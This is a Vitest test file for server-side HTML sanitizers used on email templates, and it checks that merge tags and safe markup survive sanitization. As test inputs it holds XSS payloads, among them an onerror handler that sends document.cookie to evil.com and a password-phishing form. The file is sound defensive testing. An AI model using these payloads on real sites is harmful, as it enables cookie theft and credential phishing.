import { describe, it, expect } from 'vitest';
import { sanitizeHtmlServer, sanitizeEmailHtml } from '@/lib/sanitize-server';

describe('sanitizeHtmlServer', () => {
  describe('basic HTML sanitization', () => {
    it('should allow safe HTML tags', () => {
      const input = '<p>Hello <strong>World</strong></p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<p>');
      expect(result).toContain('Hello');
      expect(result).toContain('<strong>World</strong>');
      expect(result).toContain('</p>');
    });

    it('should allow headings', () => {
      const input = '<h1>Title</h1><h2>Subtitle</h2>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<h1>Title</h1>');
      expect(result).toContain('<h2>Subtitle</h2>');
    });

    it('should allow links with href attributes', () => {
      const input = '<a href="https://example.com">Click here</a>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('href="https://example.com"');
      expect(result).toContain('Click here');
    });

    it('should allow images with src and alt attributes', () => {
      const input = '<img src="https://example.com/image.png" alt="Test image">';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('src="https://example.com/image.png"');
      expect(result).toContain('alt="Test image"');
    });

    it('should allow tables with proper structure', () => {
      const input = '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<table>');
      expect(result).toContain('<thead>');
      expect(result).toContain('<tr>');
      expect(result).toContain('<th>Header</th>');
      expect(result).toContain('<tbody>');
      expect(result).toContain('<td>Cell</td>');
    });

    it('should allow lists', () => {
      const input = '<ul><li>Item 1</li><li>Item 2</li></ul>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>Item 1</li>');
      expect(result).toContain('<li>Item 2</li>');
    });

    it('should allow formatting tags', () => {
      const input = '<b>bold</b> <i>italic</i> <u>underline</u> <em>emphasis</em>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<b>bold</b>');
      expect(result).toContain('<i>italic</i>');
      expect(result).toContain('<u>underline</u>');
      expect(result).toContain('<em>emphasis</em>');
    });

    it('should allow blockquote and pre tags', () => {
      const input = '<blockquote>Quote</blockquote><pre>Preformatted</pre>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<blockquote>');
      expect(result).toContain('Quote');
      expect(result).toContain('<pre>');
      expect(result).toContain('Preformatted');
    });

    it('should allow code tags', () => {
      const input = '<code>const x = 1;</code>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<code>');
      expect(result).toContain('const x = 1;');
    });

    it('should allow style attribute', () => {
      const input = '<p style="color: red; font-size: 14px;">Styled text</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('style');
      expect(result).toContain('color: red');
    });

    it('should allow class and id attributes', () => {
      const input = '<div class="container" id="main">Content</div>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('class="container"');
      expect(result).toContain('id="main"');
    });
  });

  describe('XSS prevention - script tags', () => {
    it('should remove script tags', () => {
      const input = '<p>Hello</p><script>alert("xss")</script>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
    });

    it('should remove inline script tags with attributes', () => {
      const input = '<script src="evil.js" type="text/javascript">alert(1)</script>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('evil.js');
    });

    it('should remove script tags with various cases', () => {
      const input1 = '<SCRIPT>alert(1)</SCRIPT>';
      const input2 = '<ScRiPt>alert(2)</ScRiPt>';
      expect(sanitizeHtmlServer(input1)).not.toContain('<script');
      expect(sanitizeHtmlServer(input2)).not.toContain('<script');
    });

    it('should remove nested script tags', () => {
      const input = '<div><script><script>alert(1)</script></script></div>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<script');
    });
  });

  describe('XSS prevention - event handlers', () => {
    it('should remove onerror event handler from img', () => {
      const input = '<img src="x" onerror="alert(1)">';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('should remove onload event handler', () => {
      const input = '<body onload="alert(1)"><p>Content</p></body>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('onload');
    });

    it('should remove onclick event handler', () => {
      const input = '<button onclick="alert(1)">Click me</button>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('onclick');
    });

    it('should remove onmouseover event handler', () => {
      const input = '<p onmouseover="alert(1)">Hover me</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('onmouseover');
    });

    it('should remove onfocus event handler', () => {
      const input = '<input type="text" onfocus="alert(1)">';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('onfocus');
    });

    it('should remove onblur event handler', () => {
      const input = '<input type="text" onblur="alert(1)">';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('onblur');
    });

    it('should remove multiple event handlers', () => {
      const input = '<img src="x" onerror="alert(1)" onload="console.log(1)" onclick="hack()">';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('onload');
      expect(result).not.toContain('onclick');
    });
  });

  describe('XSS prevention - dangerous tags', () => {
    it('should remove iframe tags', () => {
      const input = '<iframe src="evil.com"></iframe>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<iframe');
    });

    it('should remove object tags', () => {
      const input = '<object data="evil.swf"></object>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<object');
    });

    it('should remove embed tags', () => {
      const input = '<embed src="evil.swf">';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<embed');
    });

    it('should remove form tags', () => {
      const input = '<form action="evil.com" method="POST"><input type="text"><button>Submit</button></form>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<form');
      expect(result).not.toContain('<input');
      expect(result).not.toContain('<button');
    });

    it('should remove form and input tags but preserve text content', () => {
      const input = '<p>Before</p><form><input placeholder="Name">Submit</form><p>After</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<p>Before</p>');
      expect(result).toContain('<p>After</p>');
      expect(result).not.toContain('<form');
      expect(result).not.toContain('<input');
    });

    it('should remove textarea tags', () => {
      const input = '<textarea>Some text</textarea>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<textarea');
    });
  });

  describe('URL sanitization', () => {
    it('should allow safe https links', () => {
      const input = '<a href="https://example.com">Link</a>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('href="https://example.com"');
    });

    it('should allow safe http links', () => {
      const input = '<a href="http://example.com">Link</a>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('href="http://example.com"');
    });

    it('should allow relative links', () => {
      const input = '<a href="/page">Link</a>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('href="/page"');
    });

    it('should remove javascript: links', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('javascript:');
    });

    it('should remove data: URLs', () => {
      const input = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('data:');
    });

    it('should remove vbscript: links', () => {
      const input = '<a href="vbscript:msgbox(1)">Click</a>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('vbscript:');
    });

    it('should allow safe image URLs', () => {
      const input = '<img src="https://example.com/pic.jpg" alt="Picture">';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('src="https://example.com/pic.jpg"');
    });

    it('should remove javascript: in image src', () => {
      const input = '<img src="javascript:alert(1)" alt="Pic">';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('javascript:');
    });
  });

  describe('HTML entity encoding', () => {
    it('should preserve HTML entities in content', () => {
      const input = '<p>&amp; &lt; &gt; &quot; &#39;</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('&amp;');
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
    });

    it('should handle numeric HTML entities and convert them', () => {
      const input = '<p>&#169; &#8364; &#x00A9;</p>';
      const result = sanitizeHtmlServer(input);
      // DOMPurify converts numeric entities to actual characters
      expect(result).toContain('©');
      expect(result).toContain('€');
    });

    it('should escape injected HTML in text content', () => {
      const input = '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).not.toContain('<script');
    });
  });

  describe('empty/null/undefined input handling', () => {
    it('should return empty string for null input', () => {
      const result = sanitizeHtmlServer(null as unknown as string);
      expect(result).toBe('');
    });

    it('should return empty string for undefined input', () => {
      const result = sanitizeHtmlServer(undefined as unknown as string);
      expect(result).toBe('');
    });

    it('should return empty string for empty string input', () => {
      const result = sanitizeHtmlServer('');
      expect(result).toBe('');
    });

    it('should return empty string for whitespace only', () => {
      const result = sanitizeHtmlServer('   ');
      expect(result).toBe('   ');
    });

    it('should handle non-string input gracefully', () => {
      const result = sanitizeHtmlServer(123 as unknown as string);
      expect(result).toBe('');
    });

    it('should handle boolean input', () => {
      const result = sanitizeHtmlServer(true as unknown as string);
      expect(result).toBe('');
    });

    it('should handle object input', () => {
      const result = sanitizeHtmlServer({} as unknown as string);
      expect(result).toBe('');
    });
  });

  describe('large input handling', () => {
    it('should handle large HTML documents', () => {
      const largeContent = '<p>Content</p>'.repeat(1000);
      const input = `<div>${largeContent}</div>`;
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<div>');
      expect(result).toContain('Content');
      expect(result.length).toBeGreaterThan(1000);
    });

    it('should handle large text content', () => {
      const largeText = 'A'.repeat(10000);
      const input = `<p>${largeText}</p>`;
      const result = sanitizeHtmlServer(input);
      expect(result).toContain(largeText);
    });

    it('should handle deeply nested HTML', () => {
      let input = '<div>';
      for (let i = 0; i < 50; i++) {
        input += '<div>';
      }
      input += 'Deep content';
      for (let i = 0; i < 50; i++) {
        input += '</div>';
      }
      input += '</div>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('Deep content');
    });
  });

  describe('Unicode character handling', () => {
    it('should preserve Arabic text', () => {
      const input = '<p>مرحبا بك في العالم</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('مرحبا بك في العالم');
    });

    it('should preserve Chinese characters', () => {
      const input = '<p>你好世界</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('你好世界');
    });

    it('should preserve emoji characters', () => {
      const input = '<p>Hello 👋 World 🌍</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('👋');
      expect(result).toContain('🌍');
    });

    it('should preserve mixed language content', () => {
      const input = '<p>Hello مرحبا こんにちは</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('Hello');
      expect(result).toContain('مرحبا');
      expect(result).toContain('こんにちは');
    });

    it('should preserve special Unicode characters', () => {
      const input = '<p>™ © ® € £ ¥</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('™');
      expect(result).toContain('©');
      expect(result).toContain('®');
    });

    it('should handle Unicode in attributes', () => {
      const input = '<a href="/page" title="مرحبا">Link</a>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('title="مرحبا"');
    });

    it('should handle right-to-left text with dir attribute', () => {
      const input = '<p dir="rtl">مرحبا بك</p>';
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('مرحبا بك');
    });
  });

  describe('custom options', () => {
    it('should allow custom DOMPurify configuration', () => {
      const input = '<p style="background: red;">Content</p>';
      const customConfig = { ALLOW_DATA_ATTR: true };
      const result = sanitizeHtmlServer(input, customConfig);
      expect(result).toContain('Content');
    });

    it('should override default tags with custom config', () => {
      const input = '<b>Bold</b><script>alert(1)</script>';
      const customConfig = { ALLOWED_TAGS: ['b'] };
      const result = sanitizeHtmlServer(input, customConfig);
      expect(result).toContain('<b>Bold</b>');
      expect(result).not.toContain('<script');
    });
  });

  describe('complex email scenarios', () => {
    it('should sanitize complete email HTML', () => {
      const input = `
        <html>
          <body>
            <h1>Welcome</h1>
            <p>Dear customer,</p>
            <p>Thank you for your purchase!</p>
            <table>
              <tr>
                <td>Product</td>
                <td>Price</td>
              </tr>
            </table>
            <p><a href="https://example.com">View Details</a></p>
          </body>
        </html>
      `;
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<h1>Welcome</h1>');
      expect(result).toContain('Dear customer');
      expect(result).toContain('<table>');
      expect(result).toContain('href="https://example.com"');
    });

    it('should handle malicious email templates', () => {
      const input = `
        <h1>Special Offer</h1>
        <img src="x" onerror="fetch('evil.com/steal?data=' + document.cookie)">
        <iframe src="evil.com"></iframe>
        <form action="evil.com" method="POST">
          <input type="password" name="pass">
          <button type="submit">Verify</button>
        </form>
      `;
      const result = sanitizeHtmlServer(input);
      expect(result).toContain('<h1>Special Offer</h1>');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('<form');
      expect(result).not.toContain('<input');
      expect(result).not.toContain('evil.com');
    });
  });
});

describe('sanitizeEmailHtml', () => {
  describe('merge tag preservation', () => {
    it('should preserve single merge tag', () => {
      const input = '<p>Hello {{firstName}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('Hello');
    });

    it('should preserve multiple merge tags', () => {
      const input = '<p>Dear {{firstName}} {{lastName}}, welcome to {{company}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
      expect(result).toContain('{{company}}');
    });

    it('should preserve email merge tag', () => {
      const input = '<p>Contact: {{email}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{email}}');
    });

    it('should preserve date merge tag', () => {
      const input = '<p>Date: {{date}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{date}}');
    });

    it('should preserve custom field merge tags', () => {
      const input = '<p>{{customField1}} and {{customField2}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{customField1}}');
      expect(result).toContain('{{customField2}}');
    });

    it('should preserve unsubscribe link merge tag', () => {
      const input = '<p><a href="{{unsubscribeLink}}">Unsubscribe</a></p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{unsubscribeLink}}');
    });

    it('should preserve merge tags in attributes', () => {
      const input = '<img src="{{imageUrl}}" alt="Product">';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{imageUrl}}');
    });

    it('should preserve merge tags with different bracket styles', () => {
      const input = '<p>{{simple}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{simple}}');
    });
  });

  describe('XSS prevention with merge tags', () => {
    it('should preserve merge tags while removing script tags', () => {
      const input = '<p>Hello {{firstName}}</p><script>alert(1)</script>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).not.toContain('<script');
    });

    it('should preserve merge tags while removing event handlers', () => {
      const input = '<img src="x" onerror="alert(1)"> Hello {{firstName}}';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).not.toContain('onerror');
    });

    it('should preserve merge tags while removing iframes', () => {
      const input = '<p>Name: {{firstName}}</p><iframe src="evil.com"></iframe>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).not.toContain('<iframe');
    });

    it('should preserve merge tags while removing forms', () => {
      const input = '<form><input type="text"></form><p>{{email}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{email}}');
      expect(result).not.toContain('<form');
      expect(result).not.toContain('<input');
    });
  });

  describe('complex email templates with merge tags', () => {
    it('should handle email template with multiple merge tags and HTML', () => {
      const input = `
        <h1>Hello {{firstName}} {{lastName}}</h1>
        <p>Thank you for signing up to {{company}}!</p>
        <p>Email: {{email}}</p>
        <p>Date: {{date}}</p>
        <a href="{{customField1}}">Visit us</a>
      `;
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
      expect(result).toContain('{{company}}');
      expect(result).toContain('{{email}}');
      expect(result).toContain('{{date}}');
      expect(result).toContain('{{customField1}}');
    });

    it('should handle merge tags in complex HTML structure', () => {
      const input = `
        <table>
          <tr>
            <td>Name: {{firstName}} {{lastName}}</td>
            <td>Company: {{company}}</td>
          </tr>
          <tr>
            <td colspan="2">Email: {{email}}</td>
          </tr>
        </table>
      `;
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
      expect(result).toContain('{{company}}');
      expect(result).toContain('{{email}}');
      expect(result).toContain('<table>');
    });

    it('should handle merge tags with adjacent XSS attempts', () => {
      const input = '<p>Dear {{firstName}}<script>alert("XSS")</script>!</p><img onerror="hack()" src="x">';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('onerror');
    });

    it('should preserve all merge tags in real-world email template', () => {
      const input = `
        <!DOCTYPE html>
        <html>
          <body>
            <h1>Welcome {{firstName}}!</h1>
            <p>Hello {{firstName}} {{lastName}},</p>
            <p>Thank you for joining {{company}}.</p>
            <p>Your email: {{email}}</p>
            <p>Registered on: {{date}}</p>
            <p>Website: {{customField1}}</p>
            <p>Phone: {{customField2}}</p>
            <p><a href="{{unsubscribeLink}}">Unsubscribe</a></p>
          </body>
        </html>
      `;
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
      expect(result).toContain('{{company}}');
      expect(result).toContain('{{email}}');
      expect(result).toContain('{{date}}');
      expect(result).toContain('{{customField1}}');
      expect(result).toContain('{{customField2}}');
      expect(result).toContain('{{unsubscribeLink}}');
    });
  });

  describe('edge cases with merge tags', () => {
    it('should handle merge tags at start and end of content', () => {
      const input = '{{firstName}} Middle Content {{lastName}}';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
      expect(result).toContain('Middle Content');
    });

    it('should handle consecutive merge tags', () => {
      const input = '<p>{{firstName}}{{lastName}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
    });

    it('should handle merge tags with special characters in content', () => {
      const input = '<p>{{firstName}} & {{lastName}} < {{company}} ></p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
      expect(result).toContain('{{company}}');
    });

    it('should handle empty merge tags gracefully', () => {
      const input = '<p>Hello {{}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('Hello');
    });

    it('should handle merge tags with numbers', () => {
      const input = '<p>{{field1}} {{field2}} {{field123}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{field1}}');
      expect(result).toContain('{{field2}}');
      expect(result).toContain('{{field123}}');
    });

    it('should preserve merge tags with underscores', () => {
      const input = '<p>{{first_name}} {{last_name}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{first_name}}');
      expect(result).toContain('{{last_name}}');
    });
  });

  describe('null/undefined input handling', () => {
    it('should return empty string for null input', () => {
      const result = sanitizeEmailHtml(null as unknown as string);
      expect(result).toBe('');
    });

    it('should return empty string for undefined input', () => {
      const result = sanitizeEmailHtml(undefined as unknown as string);
      expect(result).toBe('');
    });

    it('should return empty string for empty string input', () => {
      const result = sanitizeEmailHtml('');
      expect(result).toBe('');
    });

    it('should handle non-string input gracefully', () => {
      const result = sanitizeEmailHtml(123 as unknown as string);
      expect(result).toBe('');
    });
  });

  describe('large email templates with merge tags', () => {
    it('should handle large email template with many merge tags', () => {
      let input = '<div>';
      for (let i = 0; i < 100; i++) {
        input += `<p>Item {{field${i}}}</p>`;
      }
      input += '</div>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{field0}}');
      expect(result).toContain('{{field99}}');
    });

    it('should handle large content with merge tags scattered throughout', () => {
      const largeText = 'A'.repeat(5000);
      const input = `<p>Start {{firstName}} ${largeText} {{lastName}} End</p>`;
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
      expect(result).toContain(largeText);
    });
  });

  describe('Unicode with merge tags', () => {
    it('should preserve merge tags with Arabic text', () => {
      const input = '<p>مرحبا {{firstName}} في {{company}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('مرحبا');
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{company}}');
    });

    it('should preserve merge tags with emoji', () => {
      const input = '<p>Hello {{firstName}} 👋 from {{company}} 🌟</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{company}}');
      expect(result).toContain('👋');
      expect(result).toContain('🌟');
    });

    it('should handle mixed language with merge tags', () => {
      const input = '<p>مرحبا {{firstName}} Hello {{lastName}} こんにちは {{company}}</p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{lastName}}');
      expect(result).toContain('{{company}}');
    });
  });

  describe('correct functionality verification', () => {
    it('should still sanitize HTML in merge tag templates', () => {
      const input = '<p>Hello {{firstName}}<script>alert(1)</script></p>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{firstName}}');
      expect(result).not.toContain('<script');
    });

    it('should preserve safe HTML tags with merge tags', () => {
      const input = '<table><tr><td>Name: {{firstName}}</td><td>Email: {{email}}</td></tr></table>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('<table>');
      expect(result).toContain('{{firstName}}');
      expect(result).toContain('{{email}}');
    });

    it('should handle merge tags in link href with safe URL', () => {
      const input = '<a href="https://example.com/user/{{userId}}">Profile</a>';
      const result = sanitizeEmailHtml(input);
      expect(result).toContain('{{userId}}');
      expect(result).toContain('href="https://example.com/user/');
    });
  });
});
